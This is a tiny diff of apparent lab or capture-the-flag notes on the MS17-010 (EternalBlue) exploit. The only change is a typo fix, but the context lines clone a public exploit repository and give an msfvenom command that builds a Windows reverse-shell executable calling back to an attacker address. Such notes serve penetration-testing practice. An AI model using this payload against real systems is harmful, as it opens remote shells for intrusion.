@@ -65,6 +65,6 @@ git clone https://github.com/worawit/MS17-010.git
 * custom payload:
   * msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.28 LPORT=443 -f exe > shell.exe
 
-* need listner
+* need listener
 
  
